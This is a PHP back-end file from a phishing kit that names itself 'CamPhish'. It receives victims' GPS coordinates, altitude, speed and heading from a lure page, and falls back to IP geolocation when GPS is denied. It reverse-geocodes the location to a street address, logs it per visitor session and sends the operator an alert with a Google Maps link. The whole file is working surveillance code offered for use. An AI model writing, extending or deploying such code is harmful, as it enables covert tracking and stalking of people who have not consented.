<?php
// location.php — captures GPS or falls back to IP geo
require_once __DIR__ . '/alerts.php';
require_once __DIR__ . '/helpers.php';

$cfg  = include __DIR__ . '/config.php';
$date = date('dMYHis');
$ts   = date('d-M-Y H:i:s');
$uuid = ($cfg['session_tracking'] ?? true) ? get_visitor_uuid() : 'unknown';

$latitude  = isset($_POST['lat'])     ? trim($_POST['lat'])     : '';
$longitude = isset($_POST['lon'])     ? trim($_POST['lon'])     : '';
$accuracy  = isset($_POST['acc'])     ? trim($_POST['acc'])     : 'Unknown';
$altitude  = isset($_POST['alt'])     ? trim($_POST['alt'])     : '';
$speed     = isset($_POST['speed'])   ? trim($_POST['speed'])   : '';
$heading   = isset($_POST['heading']) ? trim($_POST['heading']) : '';
$ip        = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
$ip        = trim(explode(',', $ip)[0]);

// ── IP geolocation fallback if GPS denied ────────────────────────
$ip_geo    = '';
if (empty($latitude) || empty($longitude)) {
    $geo_json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,lat,lon,city,regionName,country,isp");
    if ($geo_json) {
        $geo = json_decode($geo_json, true);
        if (isset($geo['status']) && $geo['status'] === 'success') {
            $latitude  = $geo['lat']  ?? '';
            $longitude = $geo['lon']  ?? '';
            $accuracy  = 'IP-based (approx. 10–50 km)';
            $ip_geo    = ($geo['city'] ?? '') . ', ' . ($geo['regionName'] ?? '') . ', ' . ($geo['country'] ?? '') . ' | ISP: ' . ($geo['isp'] ?? '');
        }
    }
}

if (!empty($latitude) && !empty($longitude)) {
    $maps_link = "https://www.google.com/maps/place/{$latitude},{$longitude}";

    // ── Reverse geocoding (human-readable address) ────────────────
    $address = '';
    if ($cfg['reverse_geocode'] ?? true) {
        $address = reverse_geocode($latitude, $longitude);
    }

    // ── Compass heading ───────────────────────────────────────────
    $compass = heading_to_compass($heading ?: null);

    // ── Build log data ────────────────────────────────────────────
    $data  = "Latitude: $latitude\r\n";
    $data .= "Longitude: $longitude\r\n";
    $data .= "Accuracy: $accuracy\r\n";
    if ($altitude !== '') $data .= "Altitude: {$altitude}m\r\n";
    if ($speed    !== '') $data .= "Speed: {$speed} m/s\r\n";
    if ($heading  !== '') $data .= "Heading: {$heading}° ({$compass})\r\n";
    if ($address)         $data .= "Address: $address\r\n";
    $data .= "Google Maps: $maps_link\r\n";
    if (!empty($ip_geo))  $data .= "IP Geo Fallback: $ip_geo\r\n";
    $data .= "Date: $ts\r\n";
    $data .= "IP: $ip\r\n";
    $data .= "UUID: $uuid\r\n";

    // ── Save ──────────────────────────────────────────────────────
    $log_dir = __DIR__ . '/logs/location';
    if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);

    file_put_contents($log_dir . '/location_' . $date . '.txt', $data);
    file_put_contents($log_dir . '/current_location.txt', $data);
    file_put_contents($log_dir . '/LocationLog.log', "Location captured\n", FILE_APPEND);
    file_put_contents($log_dir . '/saved.locations.txt', "\n=== New Location [$ts] ===\n" . $data . "\n", FILE_APPEND);

    // Session timeline
    if ($uuid !== 'unknown') {
        $uuid_dir = __DIR__ . '/logs/sessions/' . $uuid;
        if (!is_dir($uuid_dir)) mkdir($uuid_dir, 0755, true);
        file_put_contents($uuid_dir . '/timeline.log', "[{$ts}] LOCATION | {$latitude},{$longitude}" . ($address ? " | {$address}" : '') . "\n", FILE_APPEND);
    }

    // ── Alert ─────────────────────────────────────────────────────
    $msg  = "📍 <b>CamPhish — GPS Location!</b>\n";
    $msg .= "🌐 Lat: <code>{$latitude}</code>\n";
    $msg .= "🌐 Lon: <code>{$longitude}</code>\n";
    $msg .= "🎯 Accuracy: <code>{$accuracy}</code>\n";
    if ($altitude !== '') $msg .= "⬆ Altitude: <code>{$altitude}m</code>\n";
    if ($speed    !== '') $msg .= "💨 Speed: <code>{$speed} m/s</code>\n";
    if ($heading  !== '') $msg .= "🧭 Heading: <code>{$heading}° ({$compass})</code>\n";
    if ($address)         $msg .= "🏠 Address: <code>{$address}</code>\n";
    $msg .= "🗺 <a href=\"{$maps_link}\">Open in Google Maps</a>";
    if (!empty($ip_geo))  $msg .= "\n📡 IP Geo: $ip_geo";

    dispatch_alert('location', $msg, [
        'lat' => $latitude, 'lon' => $longitude,
        'accuracy' => $accuracy, 'address' => $address,
        'maps' => $maps_link, 'uuid' => $uuid,
    ]);

    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'address' => $address]);
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing']);
}
exit();